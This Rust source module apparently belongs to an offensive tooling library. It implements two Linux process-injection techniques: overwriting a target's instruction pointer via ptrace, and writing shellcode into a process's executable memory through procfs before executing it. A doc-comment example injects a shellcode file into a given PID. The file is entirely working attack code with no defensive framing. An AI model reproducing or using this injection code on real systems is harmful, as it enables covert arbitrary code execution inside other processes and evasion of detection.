//! Techniques that inject a payload into an existing process.

use nix::sys::signal::kill;
use nix::sys::signal::Signal::{SIGCONT, SIGSTOP};

use crate::error::{Error, Result};
use crate::payload::{Inject, Payload, PayloadType};
use crate::primitives::procfs::{find_mem_region, mem_exec, mem_write};
use crate::primitives::ptrace::ptace_write_rip;

/// Uses ptrace to inject shellcode into a target process by overwriting its RIP register.
/// Only works with shellcode payloads.
///
/// # Arguments
/// * `payload` - A `Payload<Inject>` containing shellcode and target process ID
///
/// # Errors
/// Returns an error if:
/// - The payload type is `Executable` (only shellcode is supported)
/// - Process manipulation fails
///
/// # Examples
/// ```no_run
/// use linc::payload::{Inject, Payload};
/// use linc::techniques::inject;
///
/// // Inject shellcode into process with PID 1234
/// let payload = Payload::<Inject>::from_file("shellcode.bin", 1234).unwrap();
///
/// inject::hollow(payload).unwrap();
/// ```
pub fn hollow(payload: Payload<Inject>) -> Result<()> {
    match payload.payload_type() {
        PayloadType::Executable => {
            return Err(Error::NotImplemented(
                "hollow can not take executables".to_string(),
            ));
        }
        PayloadType::Shellcode => {
            ptace_write_rip(payload.pid(), payload.bytes(), false)?;
        }
    }
    Ok(())
}

pub fn procfs_hollow(payload: Payload<Inject>) -> Result<()> {
    match payload.payload_type() {
        PayloadType::Executable => {
            return Err(Error::NotImplemented(
                "hollow can not take executables".to_string(),
            ));
        }
        PayloadType::Shellcode => {
            let pid = payload.pid();

            kill(pid, SIGSTOP)?;

            let addr = find_mem_region(pid, true, "r-x")?[0];

            mem_write(pid, addr, payload.bytes())?;

            mem_exec(pid, addr)?;

            kill(pid, SIGCONT)?;
        }
    }

    Ok(())
}
